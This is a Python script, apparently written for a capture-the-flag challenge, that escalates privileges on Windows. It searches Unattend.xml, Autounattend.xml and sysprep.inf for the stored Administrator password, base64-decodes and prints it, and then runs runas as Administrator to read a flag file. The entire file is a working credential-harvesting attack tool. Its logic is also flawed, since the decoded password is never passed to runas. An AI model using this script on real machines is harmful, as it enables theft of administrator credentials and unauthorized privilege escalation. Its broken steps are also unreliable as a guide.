import os
import re
import base64
import subprocess

# List of file paths to search for unattended installation files
file_paths = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Autounattend.xml",
    r"C:\Windows\System32\sysprep\sysprep.inf"
]

# Regex pattern to extract <Value>password</Value>
admin_pwd_pattern = re.compile(r"<AdministratorPassword>.*?<Value>(.*?)</Value>", re.DOTALL)

def find_password():
    for path in file_paths:
        if os.path.exists(path):
            print(f"[+] Found file: {path}")
            with open(path, 'r', encoding="utf-8", errors="ignore") as f:
                content = f.read()
                match = admin_pwd_pattern.search(content)
                if match:
                    encoded_pwd = match.group(1).strip()
                    print(f"[+] Extracted encoded password: {encoded_pwd}")
                    return encoded_pwd
    print("[-] No admin password found in files.")
    return None

def decode_password(encoded_pwd):
    try:
        # Decoding base64 password if it is base64-encoded
        decoded_bytes = base64.b64decode(encoded_pwd)
        decoded_pwd = decoded_bytes.decode('utf-8', errors='ignore')
        print(f"[+] Decoded password: {decoded_pwd}")
        return decoded_pwd
    except Exception as e:
        print(f"[-] Failed to decode password: {e}")
        return encoded_pwd  # Return raw if decoding fails

def runas_admin(decoded_pwd):
    try:
        cmd = f'runas /user:Administrator "cmd /c type C:\\Users\\Administrator\\Desktop\\flag.txt"'
        subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"[-] Error using runas: {e}")

if __name__ == "__main__":
    print("[*] Scanning for unattended installation files...")
    encoded_pwd = find_password()
    if encoded_pwd:
        decoded_pwd = decode_password(encoded_pwd)
        print("[*] Attempting to access Administrator session...")
        runas_admin(decoded_pwd)
